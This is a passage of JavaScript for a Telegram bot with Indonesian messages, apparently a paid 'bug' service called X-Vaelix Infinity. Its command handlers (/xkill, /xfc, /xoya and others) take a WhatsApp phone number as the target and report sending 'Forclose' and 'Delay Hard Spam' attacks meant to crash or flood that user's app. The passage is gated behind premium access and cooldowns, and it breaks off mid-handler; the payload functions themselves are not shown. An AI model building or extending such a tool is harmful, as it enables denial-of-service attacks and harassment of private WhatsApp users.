  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose One Msg
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose One Msg
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/xkill (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/xkill"] === true) {
    return bot.sendMessage(chatId, "❌ Command /xkill sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /xkill`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V2
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V2
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/xynerx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/xynerx"] === true) {
    return bot.sendMessage(chatId, "❌ Command /xynerx sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /xynerx`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V3
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V3
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/zypherx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/zypherx"] === true) {
    return bot.sendMessage(chatId, "❌ Command /zypherx sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /zypherx`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V4
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V4
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/xivorx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/xivorx"] === true) {
    return bot.sendMessage(chatId, "❌ Command /xivorx sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /xivorx`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V5
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V5
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/xoya (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/xoya"] === true) {
    return bot.sendMessage(chatId, "❌ Command /xoya sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /xoya`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V7
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam V7
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/xfc (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/xfc"] === true) {
    return bot.sendMessage(chatId, "❌ Command /xfc sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /xfc`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : FORCLOSE SPAM
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : FORCLOSE SPAM
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/noctex (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/noctex"] === true) {
